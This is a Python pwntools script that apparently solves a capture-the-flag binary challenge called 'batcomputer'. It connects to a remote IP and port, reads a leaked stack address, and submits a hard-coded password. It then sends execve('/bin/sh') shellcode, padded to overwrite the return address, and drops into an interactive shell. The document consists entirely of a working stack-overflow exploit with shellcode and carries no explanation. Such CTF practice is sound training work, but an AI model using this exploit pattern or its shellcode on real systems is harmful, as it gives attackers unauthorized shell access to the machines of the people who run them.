from pwn import *

#p = process('./batcomputer')
p = remote('167.99.95.121', 30819)

p.recvuntil(b'> ')
p.sendline(b'1')
leak = p.recvline().strip(b"It was very hard, but Alfred managed to locate him: ")

shellcode_addr = int(leak, 16)
print(shellcode_addr)

p.recvuntil(b'> ')
p.sendline(b'2')

p.recvuntil(b'password: ')
p.sendline(b'b4tp@$$w0rd!')

p.recvuntil(b'commands: ')
#p.sendline(b'A' * 84)

# https://www.exploit-db.com/exploits/35205
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print(len(shellcode))
shellcode += b"A" * (84-len(shellcode))
shellcode += p64(shellcode_addr)

p.sendline(shellcode)

p.recvuntil(b'> ')
p.sendline(b'444')

p.interactive()
